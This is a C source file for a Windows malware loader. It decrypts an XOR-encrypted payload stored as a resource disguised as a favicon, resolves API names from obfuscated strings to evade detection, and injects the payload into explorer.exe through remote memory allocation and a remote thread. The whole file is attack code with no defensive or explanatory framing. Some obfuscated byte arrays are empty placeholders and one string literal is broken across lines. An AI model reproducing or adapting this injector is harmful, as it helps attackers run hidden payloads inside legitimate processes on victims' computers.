#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"

// Function pointers for API calls
LPVOID (WINAPI * allocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
BOOL (WINAPI * writeMem)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
HANDLE (WINAPI * createThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

char key[] = "mysecretkeee";
char key2[] = "s12";

// XOR encryption/decryption
void XOR(char * data, size_t len, char * key, size_t key_len) {
    int j = 0;
    for (int i = 0; i < len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] ^= key[j++];
    }
}

// Find process ID of target
int FindTarget(const char *procname) {
    PROCESSENTRY32 pe32;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return 0;
    }

    while (Process32Next(snapshot, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            CloseHandle(snapshot);
            return pe32.th32ProcessID;
        }
    }

    CloseHandle(snapshot);
    return 0;
}

// Inject payload into process
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
    unsigned char s_allocEx[] = { /* obfuscated bytes */ };
    unsigned char s_writeMem[] = { /* obfuscated bytes */ };
    unsigned char s_createThread[] = { /* obfuscated bytes */ };

    XOR((char *) s_allocEx, sizeof(s_allocEx), key2, sizeof(key2));
    XOR((char *) s_writeMem, sizeof(s_writeMem), key2, sizeof(key2));
    XOR((char *) s_createThread, sizeof(s_createThread), key2, sizeof(key2));

    allocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), s_allocEx);
    writeMem = GetProcAddress(GetModuleHandle("kernel32.dll"), s_writeMem);
    createThread = GetProcAddress(GetModuleHandle("kernel32.dll"), s_createThread);

    LPVOID remote = allocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    writeMem(hProc, remote, payload, payload_len, NULL);

    HANDLE hThread = createThread(hProc, NULL, 0, remote, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

// Main execution
int main(void) {
    void * exec_mem;
    HANDLE hProc;
    DWORD oldprotect;
    unsigned char * payload;
    unsigned int payload_len;

    HRSRC res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    HGLOBAL resHandle = LoadResource(NULL, res);
    payload = (char *) LockResource(resHandle);
    payload_len = SizeofResource(NULL, res);

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(exec_mem, payload, payload_len);
    XOR((char *) exec_mem, payload_len, key, sizeof(key));

    printf("Ready to inject. Press Enter to continue...
");
    getchar();

    int pid = FindTarget("explorer.exe");
    if (pid) {
        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (hProc) {
            Inject(hProc, exec_mem, payload_len);
            CloseHandle(hProc);
        }
    }

    return 0;
}
